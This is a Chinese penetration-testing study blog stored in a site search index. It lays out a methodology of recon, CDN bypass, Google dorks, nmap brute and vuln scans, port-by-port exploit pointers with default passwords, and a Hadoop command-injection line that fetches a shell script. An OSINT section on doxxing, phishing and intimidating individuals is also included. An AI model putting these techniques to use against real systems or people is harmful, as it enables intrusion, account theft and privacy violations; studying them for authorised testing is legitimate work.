<?xml version="1.0" encoding="utf-8"?>
<search>
  <entry>
    <title>博客简介</title>
    <url>/2021/02/14/First/</url>
    <content><![CDATA[<h1 id="这个blog用于记录学习渗透测试的经验"><a href="#这个blog用于记录学习渗透测试的经验" class="headerlink" title="这个blog用于记录学习渗透测试的经验"></a>这个blog用于记录学习渗透测试的经验</h1>]]></content>
  </entry>
  <entry>
    <title>渗透流程归纳(by Mr.M)</title>
    <url>/2021/02/14/%E6%B8%97%E9%80%8F%E6%B5%81%E7%A8%8B%E5%BD%92%E7%BA%B3/</url>
    <content><![CDATA[<p><strong>写在开头：</strong><br>　　<strong>知识面，决定看到的攻击面有多广。</strong><br>　　<strong>知识链，决定发动的杀伤链有多深。</strong><a id="more"></a></p>
<hr>
<p>未经作者授权禁止转载</p>
<h1 id="0x00-信息收集"><a href="#0x00-信息收集" class="headerlink" title="0x00 信息收集"></a>0x00 信息收集</h1><p>　　从旁观者的角度了解整个WEB应用乃至整个目标的全貌，但是资产是收集不完的，可以边收集，边进行一定程度的测试。信息收集最小的粒度应是<strong>目录</strong>。</p>
<h2 id="1-目标确认"><a href="#1-目标确认" class="headerlink" title="1.目标确认"></a>1.目标确认</h2><h3 id="1-1域名注册信息"><a href="#1-1域名注册信息" class="headerlink" title="1.1域名注册信息"></a>1.1域名注册信息</h3><p>　　　　<strong>通过如下步骤确认目标所有者信息：</strong><br>　　　　　　Whois 目标域名/主机名：whois example.com<br>　　　　　　解析目标域名/主机名的IP地址：dig +short example.com<br>　　　　　　获取域名的详细解析过程：dig +trace example.com<br>　　　　　　后续用于字典制作和进一步收集目标信息的基础<br>　　　　<br>　　　　<strong>获取真实IP：</strong><br>　　　　　　浏览器切换手机模式，可能是真实ip，公众号、小程序中的资产也可能对应真实ip。<br>　　　　<br>　　　　<strong>验证是否存在CDN</strong><br>　　　　　　方法1：<br>　　　　　　使用各种多地 ping 的服务，查看对应 IP 地址是否唯一，如果不唯一多半是使用了CDN， 多地 Ping 网站有：<br>　　　　　　<a href="http://ping.chinaz.com/">http://ping.chinaz.com/</a><br>　　　　　　<a href="http://ping.aizhan.com/">http://ping.aizhan.com/</a><br>　　　　　　<a href="http://ce.cloud.360.cn/">http://ce.cloud.360.cn/</a><br>　　　　　　方法2：<br>　　　　　　试用nslookup进行检测，如果返回域名解析对应多个IP，那么多半是试用了CDN.<br>　　　　　　nslookup example.com<br>　　　　　　方法3:<br>　　　　　　在线工具查看是否存在CDN，可以参考以下站点:<br>　　　　　　<a href="http://www.cdnplanet.com/tools/cdnfinder">http://www.cdnplanet.com/tools/cdnfinder</a><br>　　　　　　<a href="http://www.ipip.net/ip.html">http://www.ipip.net/ip.html</a><br>　　　　<br>　　　　<strong>绕过CDN查找网站真实IP</strong><br>　　　　　　1.查询历史DNS记录(ip的历史解析域名，域名的历史解析ip)<br>　　　　　　查看 IP 与 域名绑定的历史记录，可能会存在使用 CDN 前的记录，相关查询网站有：<br>　　　　　　<a href="https://dnsdb.io/zh-cn/">https://dnsdb.io/zh-cn/</a><br>　　　　　　<a href="https://x.threatbook.cn/">https://x.threatbook.cn/</a><br>　　　　　　<a href="https://censys.io/ipv4?q=baidu.com">https://censys.io/ipv4?q=baidu.com</a><br>　　　　　　非常牛逼的IP记录站，还能分析内链之类找出可能的IP地址，此外还会记录历史。<br>　　　　　　viewdns.info</p>
<p>　　　　　　同样是个令站长十分蛋疼的DNS历史记录网站，记录了几年内的更改记录。<br>　　　　　　securitytrails.com<br>　　　　　　<a href="https://site.ip138.com/">https://site.ip138.com/</a></p>
<p>　　　　　　庞大的DNS历史数据库，可以查出几年内网站用过的IP、机房信息等。<br>　　　　　　iphostinfo.com<br>　　　　　　注意：这个网站可以遍历FTP、MX记录和常见二级域名，有些站长喜欢把邮箱服务也放在自己主机上，侧面泄露了真实的IP地址，通过这个网站可以进行检查。</p>
<p>　　　　　　2.查询子域名（捷径，去众测平台、github找官方发布过的）<br>　　　　　　注意：有可能有些站长只给主站或流量大的子域名做了CDN,而很多子域名都是和主站在同一台服务器上，或者 C段中，这样可以通过子域名来辅助找到网站真实IP<br>　　　　　　爆破子域名:<br>　　　　　　主动式<br>　　　　　　layer子域名挖掘机（字典要自己丰富）<br>　　　　　　<a href="http://z.zcjun.com/(%E5%9C%A8%E7%BA%BF%E5%AD%90%E5%9F%9F%E5%90%8D%E6%8C%96%E6%8E%98)">http://z.zcjun.com/(在线子域名挖掘)</a><br>　　　　　　fuzzdomain 很好用，速度快<br>　　　　　　被动式<br>　　　　　　搜索引擎拿子域名、旁站（同IP网站）、C段：<br>　　　　　　可用搜索引擎语法查询子域名：<br>　　　　　　谷歌、百度、bing、搜狗(搜索微信文章)、雅虎等略有差异<br>　　　　　　详细用法:<br>　　　　　　　　（1）site: =主域名,搜索其主要域名下面的子域名<br>　　　　　　　　（2）allintext: = 搜索文本,但不包括网页标题和链接<br>　　　　　　　　（3）allinlinks: = 搜索链接, 不包括文本和标题。<br>　　　　　　　　（4）related:URL = 列出于目标URL地址有关的网页。<br>　　　　　　　　（5）link:URL = 列出到链接到目标URL的网页清单。<br>　　　　　　　　（6）使用“-”去掉不想看的结果，例如site:baidu.com -image.baidu.com<br>　　　　　　　　百度语法：<br>　　　　　　　　<a href="https://www.cnblogs.com/k0xx/p/12794452.html">https://www.cnblogs.com/k0xx/p/12794452.html</a><br>　　　　谷歌语法：<a href="https://blog.csdn.net/u012991692/article/details/82937100?biz_id=102&amp;utm_term=Googlehack&amp;utm_medium=distribute.pc_search_result.none-task-blog-2~all~sobaiduweb~default-0-82937100&amp;spm=1018.2118.3001.4187">https://blog.csdn.net/u012991692/article/details/82937100?biz_id=102&amp;utm_term=Googlehack&amp;utm_medium=distribute.pc_search_result.none-task-blog-2~all~sobaiduweb~default-0-82937100&amp;spm=1018.2118.3001.4187</a><br>　　　　　　　　GHDB：<br>　　　　　　　　<a href="https://www.exploit-db.com/google-hacking-database">https://www.exploit-db.com/google-hacking-database</a></p>
<p>　　　　　　3.资产搜索(旁站\C段\特征):</p>
<p>　　　　　　<a href="https://www.shodan.io(资产相关或特征值关键字爆ip)/">https://www.shodan.io(资产相关或特征值关键字爆ip)</a><br>　　　　　　<a href="https://fofa.so/">https://fofa.so</a><br>　　　　　　<a href="https://www.zoomeye.org/">https://www.zoomeye.org/</a><br>　　　　　　<a href="http://www.yunsee.cn/info.html">http://www.yunsee.cn/info.html</a> （云悉在线资产平台)<br>　　　　　　<a href="http://subdomain.chaxun.la/">http://subdomain.chaxun.la</a> （查询啦）<br>　　　　　　<a href="https://www.virustotal.com/gui/home/search">https://www.virustotal.com/gui/home/search</a><br>　　　　　　<a href="https://dnsdumpster.com/">https://dnsdumpster.com/</a><br>　　　　　　<a href="https://duckduckgo.com/">https://duckduckgo.com</a> （一个不会存储你个人信息的搜索引擎）<br>　　　　　　<a href="https://crt.sh/%EF%BC%88SSL%E8%AF%81%E4%B9%A6%E6%9F%A5%E8%AF%A2%EF%BC%89">https://crt.sh/（SSL证书查询）</a><br>　　　　　　<a href="https://icp.aizhan.com/(%E5%9F%9F%E5%90%8D%E5%A4%87%E6%A1%88)">https://icp.aizhan.com/(域名备案)</a><br>　　　　　　4.对方服务器给自己发邮件暴露IP<br>　　　　　　5.APP客户端爆ip</p>
<h3 id="1-2DNS信息查询"><a href="#1-2DNS信息查询" class="headerlink" title="1.2DNS信息查询"></a>1.2DNS信息查询</h3><p>　　　　<strong>目的:</strong><br>　　　　　　注册者名称及邮箱,再反查其他域名<br>　　　　　　手机号 座机号<br>　　　　　　ASN号</p>
<p>　　　　　　地址在线DNS信息查询工具<br>　　　　　　<a href="https://dnsdumpster.com/">https://dnsdumpster.com/</a><br>　　　　　　<a href="https://www.dnsdb.io/">https://www.dnsdb.io</a> （DNS搜索引擎）<br>　　　　　　<a href="http://searchdns.netcraft.com/">http://searchdns.netcraft.com</a><br>　　　　　　<a href="http://whois.nawang.cn/">http://whois.nawang.cn/</a><br>　　　　　　<a href="https://whois.aliyun.com/">https://whois.aliyun.com/</a><br>　　　　　　<a href="https://whois.west.cn/">https://whois.west.cn/</a><br>　　　　　　<a href="http://whois.chinaz.com/">http://whois.chinaz.com/</a> (站长之家)<br>　　　　　　<a href="https://www.tianyancha.com/">https://www.tianyancha.com/</a>  （天眼查）<br>　　　　　　<a href="http://www.gsxt.gov.cn/index.html">http://www.gsxt.gov.cn/index.html</a> （国家企业信用信息系统）<br>　　　　　　<a href="http://www.beianbeian.com/">www.beianbeian.com/</a>  （ICP备案查询）</p>
<h3 id="1-3测试域传送漏洞"><a href="#1-3测试域传送漏洞" class="headerlink" title="1.3测试域传送漏洞"></a>1.3测试域传送漏洞</h3><p>　　　　域传送是一种DNS事务，用于在主从服务器间复制DNS记录。虽然如今已经很少见主机会开启，但是还是应该确认一下。一旦存在域传送漏洞，就意味着你获取了整个域下面所有的记录。<br>　　　　　　dnsrecon -d example.com<br>　　　　　　dnsenum example.com    包含自动检测域传送漏洞<br>　　　　　　dnsenum还能爆破子域名，功能比较多，详见：<br>　　　　　　<a href="https://blog.csdn.net/weixin_43263851/article/details/108955964">https://blog.csdn.net/weixin_43263851/article/details/108955964</a></p>
<h3 id="1-4业务相关"><a href="#1-4业务相关" class="headerlink" title="1.4业务相关"></a>1.4业务相关</h3><pre><code>    github泄露：
    in:name test               #仓库标题搜索含有关键字 SpringCloud
    in:descripton test         #仓库描述搜索含有关键字
    in:readme test             #Readme文件搜素含有关键字
    stars:&gt;3000 test           #stars数量大于3000的搜索关键字
    stars:1000..3000 test      #stars数量大于1000小于3000的搜索关键字
    forks:&gt;1000 test           #forks数量大于1000的搜索关键字
    forks:1000..3000 test      #forks数量大于1000小于3000的搜索关键字
    size:&gt;=5000 test           #指定仓库大于5000k(5M)的搜索关键字
    pushed:&gt;2019-02-12 test    #发布时间大于        2019-02-12的搜索关键字
    created:&gt;2019-02-12 test   #创建时间大于2019-02-12的搜索关键字
    user:test                  #用户名搜素
    license:apache-2.0 test    #明确仓库的 LICENSE 搜索关键字
    language:java test         #在java语言的代码中搜索关键字
    user:test in:name test     #组合搜索,用户名test的标题含有test的
</code></pre>
<p>　　　　　　<br>　　　　　　网盘泄露：<br>　　　　　　各种云网盘，详见虫部落搜索:<br>　　　　　　magnet.chongbuluo.com<br>　　　　　　敏感路径扫描：<br>　　　　　　<a href="https://github.com/ring04h/weakfilescan">https://github.com/ring04h/weakfilescan</a></p>
<h2 id="2-OSINT-公开情报收集"><a href="#2-OSINT-公开情报收集" class="headerlink" title="2.OSINT 公开情报收集"></a>2.OSINT 公开情报收集</h2><h3 id="2-1社工技巧"><a href="#2-1社工技巧" class="headerlink" title="2.1社工技巧"></a>2.1社工技巧</h3><p>　　<strong>查看注册的网站</strong>：0xreg reg007<br>　　　　知道账号去已注册的网站找回密码，可以看到打码后的用户名、邮箱、真实姓名等信息，如果运气好没准能从数据包或html中找到未被打码的信息<br>　　　　<br>　　<strong>可以从这些方面判断用户是否注册过</strong><br>　　　　找回密码<br>　　　　　　输入账号，如果进入下一步了则该账号存在<br>　　　　登录<br>　　　　　　输入账号和密码，如果提示密码错误，则表示该用户已存在<br>　　　　注册<br>　　　　　　填写账号时一般网站会去检测该账号是否已存在，如果已存在则会提示不可重复注册<br>　　　　<br>　　<strong>知道QQ</strong><br>　　　　通过QQ邮箱和QQ号搜索支付宝、淘宝账号等其他可能的常用平台<br>　　　　去腾讯\新浪微博搜索<br>　　　　通过微信搜索<br>　　　　查看QQ空间\相册\地区\星座\生日\昵称(后续构建字典以及跨平台搜集)<br>　　　　通过说说、留言、日志找到其好友<br>　　　　加QQ钓鱼\共同好友\可能认识的人<br>　　<strong>知道手机号</strong><br>　　　　搜索QQ、微信、钉钉等社交账号<br>　　　　在比较火的一些APP和网站上注册或忘记密码来判断是否注册过账号<br>　　　　查询支付宝、QQ交易账号，尝试输入常见姓氏获取名字(转账到该手机号,会提示输入姓氏验证)<br>　　　　通过对方的职业、兴趣找到该领域知名度较高的社交网站反查<br>　　　　根据在QQ空间、朋友圈等动态用百度识图识别照片<br>　　　　在微博、ins、Twitter、fb、百度贴吧搜索相近关键字，按地域、年龄、男女、用户名等筛选<br>　　<strong>留意社交动态</strong><br>　　　　发布时间线<br>　　　　使用什么客户端 iPhone Android还是浏览器<br>　　　　　　针对客户端预先制定exploit<br>　　　　　　注意每一条链接  / 图片 / 视频链接可能包含用户ID<br>　　　　　　图片可能包含水印，exif可能会有GPS定位和手机类型,图片内容特征<br>　　　　　　视频也有可能有水印暴露社交账号ID,拍摄地点<br>　　　　　　从最早发布的动态看起，会有很大收获<br>　　　　　　一般得到一个账号的密码就相当于得到了其他账号的密码<br>　　　　　　一般人不同账号的用户名都是相同或相近的<br>　　　　　　一般人的社交账号头像用的都是一样的<br>　　　　　　尝试破解社保、公积金账号、身份证号（出生地、生日、星座、派出所代码）<br>　　　　<br>　　虫部落快搜之文件搜索:<a href="https://search.chongbuluo.com/">https://search.chongbuluo.com/</a><br>　　<br>　　qq群、群文件、贴吧论坛、目标自用论坛等社交平台<strong>钓鱼</strong>和<strong>信息泄露</strong>(爬邮箱等信息)<br>　　<br>　　电子邮件伪造、网络钓鱼<br>　　　　下载恶意程序<br>　　　　输入敏感信息<br>　　<br>　　　大部分信息可以用来生成密码字典<br>　　　<br>　　　对人：说服对方达成一致、恐吓对方（敏感词、漏洞、病毒、权威机构名称、），钓鱼获取信息</p>
<h3 id="2-2搜索引擎OSINT"><a href="#2-2搜索引擎OSINT" class="headerlink" title="2.2搜索引擎OSINT"></a>2.2搜索引擎OSINT</h3><p>　　<strong>Google Hacking</strong>(baidu\bing\souhu\github)<br>　　GoogleHacking常用语法<br>　　　　1、intext：（仅针对Google有效） 把网页中的正文内容中的某个字符作为搜索的条件<br>　　　　2、intitle： 把网页标题中的某个字符作为搜索的条件<br>　　　　3、cache： 搜索搜索引擎里关于某些内容的缓存，可能会在过期内容中发现有价值的信息<br>　　　　4、filetype/ext： 指定一个格式类型的文件作为搜索对象<br>　　　　5、inurl： 搜索包含指定字符的URL<br>　　　　6、site： 在指定的(域名)站点搜索相关内容　　<br>　　GoogleHacking其他语法<br>　　　　1、引号 ” ” 把关键字打上引号后，把引号部分作为整体来搜索<br>　　　　2、or 同时搜索两个或更多的关键字<br>　　　　3、link 搜索某个网站的链接 link:baidu.com即返回所有和baidu做了链接的URL<br>　　　　4、info 查找指定站点的一些基本信息　　GoogleHackingDatabase:<br>　　　　google-hacking-databaseGoogleHacking典型用法(<strong>特定资产的万能密码</strong>也要积累)</p>
<p>　　管理后台地址<br>　　　　site:target.com intext:管理 | 后台 | 后台管理 | 登陆 | 登录 | 用户名 | 密码 | 系统 | 账号 | login | system<br>　　　　site:target.com inurl:login | inurl:admin | inurl:manage<br>| inurl:manager | inurl:admin_login | inurl:system | inurl:backend<br>　　　　site:target.com intitle:管理 | 后台 | 后台管理 | 登陆 | 登录</p>
<p>　　上传类漏洞地址<br>　　　　site:target.com inurl:file<br>　　　　site:target.com inurl:upload</p>
<p>　　注入页面<br>　　　　site:target.com inurl:php?id=<br>　　（批量注入工具、结合搜索引擎）</p>
<p>　　编辑器页面<br>　　　　site:target.com inurl:ewebeditor</p>
<p>　　目录遍历漏洞<br>　　　　site:target.com intitle:index.of</p>
<p>　　SQL错误<br>　　　　site:target.com intext:”sql syntax near” | intext:”syntax error has occurred” | intext:”incorrect syntax near” | intext:”unexpected end of SQL command” | intext:”Warning: mysql_connect()” | intext:”Warning: mysql_query()” | intext:”Warning: pg_connect()”</p>
<p>　　phpinfo()<br>　　　　site:target.com ext:php intitle:phpinfo “published by the PHP Group”</p>
<p>　　配置文件泄露<br>　　　　site:target.com ext:.xml | .conf | .cnf | .reg | .inf | .rdp | .cfg | .txt | .ora | .ini</p>
<p>　　数据库文件泄露<br>　　　　site:target.com ext:.sql | .dbf | .mdb | .db<br>　　<br>　　日志文件泄露<br>　　　　site:target.com ext:.log</p>
<p>　　备份和历史文件泄露<br>　　　　site:target.com ext:.bkf | .bkp | .old | .backup | .bak | .swp | .rar | .txt | .zip | .7z | .sql | .tar.gz | .tgz | .tar</p>
<p>　　公开文件泄露<br>　　　　site:target.com filetype:.doc | .docx | .xls | .xlsx | .ppt | .pptx | .odt | .pdf | .rtf | .sxw | .psw | .csv</p>
<p>　　邮箱信息<br>　　　　site:target.com intext:@target.com<br>　　　　site:target.com 邮件<br>　　　　site:target.com email</p>
<p>　　社工信息<br>　　　　site:target.com intitle:账号 | 密码 | 工号 | 学号 | 身份证</p>
<h3 id="2-3浏览器实用插件："><a href="#2-3浏览器实用插件：" class="headerlink" title="2.3浏览器实用插件："></a>2.3浏览器实用插件：</h3><p>　　Wappalyzer：识别网站使用的中间件及其版本，再去漏洞库和搜索引擎找公开披露的漏洞<br>　　SwitchOmega：快捷切换代理<br>　　shodan：识别开放端口，主机服务等（被动信息搜集）<br>　　hacktools:综合插件,很强大<br>　　firefox渗透便携版version48,工具集成很多<br>　　注意：根据获得服务、中间件信息、编辑器版本、数据库等OSINT去各大漏洞库、搜索引擎找漏洞利用</p>
<h3 id="2-4乌云和cnvd"><a href="#2-4乌云和cnvd" class="headerlink" title="2.4乌云和cnvd"></a>2.4乌云和cnvd</h3><p>　　乌云库\乌云镜像\GHDB\CNVD等公开漏洞库</p>
<h1 id="0x01-主动探测"><a href="#0x01-主动探测" class="headerlink" title="0x01 主动探测"></a>0x01 主动探测</h1><p>　　从管理员和用户的角度了解整个WEB应用乃至整个目标的全貌，主动探测会暴露ip以及留下日志信息，所以要…</p>
<h2 id="1-主动扫描"><a href="#1-主动扫描" class="headerlink" title="1.主动扫描"></a>1.主动扫描</h2><h3 id="1-1常见服务漏洞"><a href="#1-1常见服务漏洞" class="headerlink" title="1.1常见服务漏洞"></a>1.1常见服务漏洞</h3><p>　　nmap的功能:<br>　　　　脚本扫描，隐蔽扫描，端口扫描，服务识别，OS识别，探测WAF<br>　　nmap脚本主要分为以下几类，在扫描时可根据需要设置<br>　　–script=类别这种方式进行比较笼统的扫描：</p>
<p>　　　　auth: 负责处理鉴权证书（绕开鉴权）的脚本<br>　　　　broadcast: 在局域网内探查更多服务开启状况，如dhcp/dns/sqlserver等服务<br>　　　　brute: 提供暴力破解方式，针对常见的应用如http/snmp等<br>　　　　default: 使用-sC或-A选项扫描时候默认的脚本，提供基本脚本扫描能力<br>　　　　discovery: 对网络进行更多的信息，如SMB枚举、SNMP查询等<br>　　　　dos: 用于进行拒绝服务攻击<br>　　　　exploit: 利用已知的漏洞入侵系统<br>　　　　external: 利用第三方的数据库或资源，例如进行whois解析<br>　　　　fuzzer: 模糊测试的脚本，发送异常的包到目标机，探测出潜在漏洞<br>　　　　intrusive: 入侵性的脚本，此类脚本可能引发对方的IDS/IPS的记录或屏蔽<br>　　　　malware: 探测目标机是否感染了病毒、开启了后门等信息<br>　　　　safe: 此类与intrusive相反，属于安全性脚本<br>　　　　version: 负责增强服务与版本扫描（Version Detection）功能的脚本<br>　　　　vuln: 负责检查目标机是否有常见的漏洞（Vulnerability），如是否有MS08_067</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">nmap --script&#x3D;auth 192.168.137.*</span><br><span class="line">负责处理鉴权证书（绕开鉴权）的脚本,也可以作为检测部分应用弱口令</span><br><span class="line"></span><br><span class="line">nmap --script&#x3D;brute 192.168.137.*</span><br><span class="line">提供暴力破解的方式  可对数据库，smb，snmp等进行简单密码的暴力猜解</span><br><span class="line"></span><br><span class="line">nmap --script&#x3D;default 192.168.137.* 或者 nmap -sC 192.168.137.*</span><br><span class="line">默认的脚本扫描，主要是搜集各种应用服务的信息，收集到后，可再针对具体服务进行攻击</span><br><span class="line"></span><br><span class="line">nmap --script&#x3D;vuln 192.168.137.*</span><br><span class="line">检查是否存在常见漏洞</span><br><span class="line"></span><br><span class="line">nmap -n -p445 --script&#x3D;broadcast 192.168.137.4</span><br><span class="line">在局域网内探查更多服务开启状况</span><br><span class="line"></span><br><span class="line">nmap --script external 202.103.243.110</span><br><span class="line">利用第三方的数据库或资源，例如进行whois解析</span><br><span class="line"></span><br><span class="line">nmap --script banner ip</span><br><span class="line">nmap -p port -sV ip</span><br><span class="line">获取软件版本信息</span><br><span class="line"></span><br><span class="line">nmap -O ip</span><br><span class="line">操作系统信息，版本</span><br><span class="line"></span><br><span class="line">nmap -A -v -sS -T2 ip</span><br><span class="line">完整信息获取,详细显示，syn探测，高速扫描，系统和服务版本信息，脚本扫描和路由跟踪,外网扫描T2比较合适，T4以上不准确</span><br><span class="line"></span><br><span class="line">-sN;-sF;-sX </span><br><span class="line">隐蔽扫描</span><br><span class="line">　　-sN是Null扫描,是通过发送非常规的TCP通信数据包进行探测</span><br><span class="line">　　nmap -sN 127.0.0.1</span><br><span class="line">　　-sF是FIN扫描,当我们使用TCP SYN扫描时可能会被目标主机的防火墙发现,会阻止SYN数据包</span><br><span class="line">　　,这时我们使用TCP FIN扫描方式会有很好的穿透效果.</span><br><span class="line">　　nmap -sF 127.0.0.1</span><br><span class="line"></span><br><span class="line">扫描前1000号TCP端口</span><br><span class="line">nmap 192.168.100.2</span><br><span class="line"></span><br><span class="line">Ping扫描8个本地主机(按ARP、ICMP、TCP 80的顺序)</span><br><span class="line">nmap –sP 192.168.100.0-7</span><br><span class="line"></span><br><span class="line">扫描80,443端口</span><br><span class="line">nmap -p 80,443 192.168.100.2</span><br><span class="line"></span><br><span class="line">扫描前1000号TCP端口，OS指纹，服务，然后运行一个NSE脚本</span><br><span class="line">sudo nmap -A 192.168.100.2</span><br><span class="line"></span><br><span class="line">扫描全部65535个TCP端口，OS指纹，服务，然后运行一个NSE脚本</span><br><span class="line">sudo nmap –A –p- 192.168.100.2</span><br><span class="line"></span><br><span class="line">扫描前1000号UDP端口</span><br><span class="line">sudo nmap -sU 192.168.100.2</span><br><span class="line"></span><br><span class="line">扫描所有65535个UDP端口</span><br><span class="line">sudo nmap -sU –p- 192.168.100.2</span><br><span class="line"></span><br><span class="line">扫描所有65535个UDP端口，并获取服务、OS指纹，之后运行一些NSE脚本</span><br><span class="line">sudo nmap –sU -p- -A 192.168.100.2</span><br></pre></td></tr></table></figure>
<p><strong>nmap脑图备查</strong>:见笔记</p>
<h3 id="1-2常见端口漏洞利用"><a href="#1-2常见端口漏洞利用" class="headerlink" title="1.2常见端口漏洞利用"></a>1.2常见端口漏洞利用</h3><p>　　快速扫描：<br>　　Masscan -p80,800 ip –rate=10000<br>21 / FTP<br>　　匿名/暴力破解<br>　　拒绝服务<br>22 / SSH<br>　　暴力破解<br>23 / telnet<br>　　Winbox(CVE-2018-14847)<br>　　<a href="https://github.com/BasuCert/WinboxPoC">https://github.com/BasuCert/WinboxPoC</a><br>　　弱口令 / 暴力破解<br>161 / snmp<br>　　弱口令<br>　　<a href="https://blog.csdn.net/archersaber39/article/details/78932252">https://blog.csdn.net/archersaber39/article/details/78932252</a><br>389 / ladp<br>　　匿名访问<br>　　<a href="https://www.cnblogs.com/persuit/p/5706432.html">https://www.cnblogs.com/persuit/p/5706432.html</a><br>　　ladp注入<br>　　<a href="http://www.4hou.com/technology/9090.html">http://www.4hou.com/technology/9090.html</a><br>　　<a href="https://www.freebuf.com/articles/web/149059.html">https://www.freebuf.com/articles/web/149059.html</a><br>443 / ssl<br>　　openssl心脏出血<br>　　<a href="https://paper.seebug.org/437/">https://paper.seebug.org/437/</a><br>　　<a href="http://www.anquan.us/static/drops/papers-1381.html">http://www.anquan.us/static/drops/papers-1381.html</a><br>　　<a href="https://www.freebuf.com/sectool/33191.html">https://www.freebuf.com/sectool/33191.html</a><br>445 / smb<br>　　win10拒绝服务<br>　　永恒之蓝RCE<br>875 / rsync<br>　　匿名访问<br>　　<a href="http://www.anquan.us/static/bugs/wooyun-2016-0190815.html">http://www.anquan.us/static/bugs/wooyun-2016-0190815.html</a><br>　　<a href="https://paper.seebug.org/409/">https://paper.seebug.org/409/</a><br>　　<a href="http://www.91ri.org/11093.html">http://www.91ri.org/11093.html</a><br>1433 / mssql<br>　　暴力破解<br>　　<a href="http://www.anquan.us/static/drops/tips-12749">http://www.anquan.us/static/drops/tips-12749</a>.　　html<br>　　<a href="https://www.seebug.org/appdir/Microsoft%20SQL%20Server">https://www.seebug.org/appdir/Microsoft%20SQL%20Server</a><br>1521 / oracle<br>　　暴力破解<br>　　<a href="https://www.exploit-db.com/exploits/33084">https://www.exploit-db.com/exploits/33084</a><br>2601 / zebra<br>　　<a href="http://www.anquan.us/static/bugs/wooyun-2013-047409.html">http://www.anquan.us/static/bugs/wooyun-2013-047409.html</a><br>3128 / squid<br>3306 / mysql<br>　　RCE<br>　　<a href="http://www.91ri.org/17511.html">http://www.91ri.org/17511.html</a><br>　　CVE-2015-0411<br>　　hash破解<br>　　<a href="https://www.freebuf.com/column/153561.html">https://www.freebuf.com/column/153561.html</a><br>　　waf绕过<br>　　<a href="https://www.freebuf.com/articles/web/155570.html">https://www.freebuf.com/articles/web/155570.html</a><br>　　general_log_file getshell<br>　　<a href="https://www.freebuf.com/column/143125.html">https://www.freebuf.com/column/143125.html</a><br>　　提权<br>　　<a href="http://www.91ri.org/16540.html">http://www.91ri.org/16540.html</a><br>3312 / kangle<br>　　getshell<br>　　<a href="https://www.secpulse.com/archives/23927.html">https://www.secpulse.com/archives/23927.html</a><br>3389 / rdp<br>　　shift 放大镜 输入法绕过 guest用户<br>　　永恒之蓝(ESTEEMAUDIT)<br>　　<a href="https://www.freebuf.com/articles/system/132171.html">https://www.freebuf.com/articles/system/132171.html</a><br>　　<a href="https://www.anquanke.com/post/id/86328">https://www.anquanke.com/post/id/86328</a><br>　　ms12-020<br>　　<a href="https://blog.csdn.net/meyo_leo/article/details/77950552">https://blog.csdn.net/meyo_leo/article/details/77950552</a><br>4440 / rundeck<br>　　<a href="https://www.secpulse.com/archives/29500.html">https://www.secpulse.com/archives/29500.html</a><br>4848 / glassfish<br>　　文件读取<br>　　<a href="https://www.secpulse.com/archives/42277.html">https://www.secpulse.com/archives/42277.html</a><br>　　<a href="https://www.anquanke.com/post/id/85948">https://www.anquanke.com/post/id/85948</a><br>　　GlassFish2 / admin:admin GlassFish3,4 / 如果管理员不设置帐号本地会自动登录,远程访问会提示配置错误<br>5432 / PostgreSQL<br>　　RCE<br>　　<a href="https://www.cnblogs.com/KevinGeorge/p/8521496.html">https://www.cnblogs.com/KevinGeorge/p/8521496.html</a><br>　　<a href="https://www.secpulse.com/archives/69153.html">https://www.secpulse.com/archives/69153.html</a><br>　　默认账号postgres<br>　　参考<br>　　<a href="http://www.91ri.org/13070.html">http://www.91ri.org/13070.html</a><br>　　<a href="http://www.91ri.org/6507.html">http://www.91ri.org/6507.html</a><br>5672,15672,4369,25672  / RabbitMQ<br>　　（guest/guest）<br>5900 / VNC<br>　　<a href="https://www.seebug.org/appdir/RealVNC">https://www.seebug.org/appdir/RealVNC</a><br>5984 / CouchDB<br>　　<a href="http://xxx:5984/_utils/">http://xxx:5984/_utils/</a><br>6082 / varnish<br>　　CLI 未授权<br>　　<a href="https://www.secpulse.com/archives/10681.html">https://www.secpulse.com/archives/10681.html</a><br>6379 / redis<br>　　Redis未授权<br>　　　ssh publickey<br>　　　crontab<br>　　　webshell<br>　　　反序列化<br>　　　开机自启文件夹写bat<br>　　　参考<br>　　　<a href="https://www.freebuf.com/column/170710.html">https://www.freebuf.com/column/170710.html</a><br>7001,7002 / WebLogic<br>　　默认弱口令<br>　　weblogic/weblogic ,weblogic/welcom ,weblogic/welcom1,weblogic1/weblogic<br>　　反序列<br>　　CVE-2018-2628<br>　　<a href="https://www.freebuf.com/articles/web/169770.html">https://www.freebuf.com/articles/web/169770.html</a><br>　　<a href="https://www.seebug.org/appdir/WebLogic">https://www.seebug.org/appdir/WebLogic</a><br>9200,9300 / elasticsearch<br>　　CVE-2015-1427<br>　　<a href="http://www.anquan.us/static/drops/papers-5142.html">http://www.anquan.us/static/drops/papers-5142.html</a><br>　　CVE-2018-17246<br>　　<a href="https://www.seebug.org/vuldb/ssvid-97730">https://www.seebug.org/vuldb/ssvid-97730</a><br>　　参考<br>　　<a href="https://www.seebug.org/search/?keywords=elasticsearch">https://www.seebug.org/search/?keywords=elasticsearch</a><br>9000 / fcgi<br>　　<a href="https://paper.seebug.org/289/">https://paper.seebug.org/289/</a><br>9043 / WebSphere<br>　　Websphere8.5<br>　　<a href="https://localhost:9043/ibm/console/logon.jsp">https://localhost:9043/ibm/console/logon.jsp</a><br>　　Websphere6-7<br>　　<a href="http://localhost:9043/ibm/console">http://localhost:9043/ibm/console</a><br>　　后台未授权，登录后可部署WAR包<br>　　SOAP服务有反序列化<br>　　弱口令：admin / password<br>11211 / memcache<br>　　未授权<br>　　UDP反射<br>　　<a href="https://shockerli.net/post/memcached-udp-reflection-attack-bug/">https://shockerli.net/post/memcached-udp-reflection-attack-bug/</a><br>27017,27018 / Mongodb<br>　　未授权<br>　　注入<br>　　<a href="https://www.anquanke.com/post/id/83763">https://www.anquanke.com/post/id/83763</a><br>　　phpMoAdmin RCE<br>　　<a href="https://www.aqniu.com/threat-alert/6978.html">https://www.aqniu.com/threat-alert/6978.html</a><br>50000 / SAP<br>　　 SAP命令执行<br>　　<a href="https://www.secpulse.com/archives/20204.html">https://www.secpulse.com/archives/20204.html</a><br>50070,50030 / hadoop<br>　　未授权<br>　　<a href="https://www.freebuf.com/vuls/173638.html">https://www.freebuf.com/vuls/173638.html</a><br>　　命令执行<br>　　host:50060/pstack?pid=123|wget <a href="http://somehost/shell.sh">http://somehost/shell.sh</a><br>　　<a href="https://www.seebug.org/search/?keywords=hadoop">https://www.seebug.org/search/?keywords=hadoop</a><br>　　其他<br>　　<a href="http://www.91ri.org/15441.html">http://www.91ri.org/15441.html</a></p>
